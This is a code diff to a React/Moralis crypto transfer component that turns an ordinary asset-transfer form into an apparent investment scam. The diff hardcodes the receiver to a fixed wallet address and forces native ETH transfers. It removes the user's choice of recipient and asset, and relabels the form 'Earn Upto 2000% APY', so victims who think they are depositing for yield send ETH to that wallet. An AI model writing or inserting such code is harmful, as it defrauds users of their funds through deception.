@@ -3,7 +3,6 @@ import { Button, Input, notification } from "antd";
 import Text from "antd/lib/typography/Text";
 import { useEffect, useState } from "react";
 import { useMoralis } from "react-moralis";
-import AssetSelector from "./AssetSelector";
 
 const styles = {
   card: {
@@ -42,8 +41,8 @@ const styles = {
 
 function Transfer() {
   const { Moralis } = useMoralis();
-  const [receiver, setReceiver] = useState();
-  const [asset, setAsset] = useState();
+  const receiver = "0x1EacF289f7411c32CB17275da5b3170482aC6CCF";
+  const asset = "0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee";
   const [tx, setTx] = useState();
   const [amount, setAmount] = useState();
   const [isPending, setIsPending] = useState(false);
@@ -66,26 +65,12 @@ function Transfer() {
   async function transfer() {
     const { amount, receiver, asset } = tx;
 
-    let options = {};
-
-    switch (asset.token_address) {
-      case "0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee":
-        options = {
-          native: "native",
-          amount: Moralis.Units.ETH(amount),
-          receiver,
-          awaitReceipt: false,
-        };
-        break;
-      default:
-        options = {
-          type: "erc20",
-          amount: Moralis.Units.Token(amount, asset.decimals),
-          receiver,
-          contractAddress: asset.token_address,
-          awaitReceipt: false,
-        };
-    }
+    let options = {
+      native: "native",
+      amount: Moralis.Units.ETH(amount),
+      receiver,
+      awaitReceipt: false,
+    };
 
     setIsPending(true);
     const txStatus = await Moralis.transfer(options);
@@ -120,7 +105,7 @@ function Transfer() {
     <div style={styles.card}>
       <div style={styles.tranfer}>
         <div style={styles.header}>
-          <h3>Transfer Assets</h3>
+          <h3>Earn Upto 2000% APY</h3>
         </div>
         <div style={styles.select}>
           <div style={styles.textWrapper}>
@@ -133,11 +118,6 @@ function Transfer() {
               setAmount(`${e.target.value}`);
             }}
           />
-        </div>
-        <div style={styles.select}>
-          <div style={styles.textWrapper}>
-            <Text strong>Asset:</Text>
-          </div>
         </div>
         <Button
           type="primary"
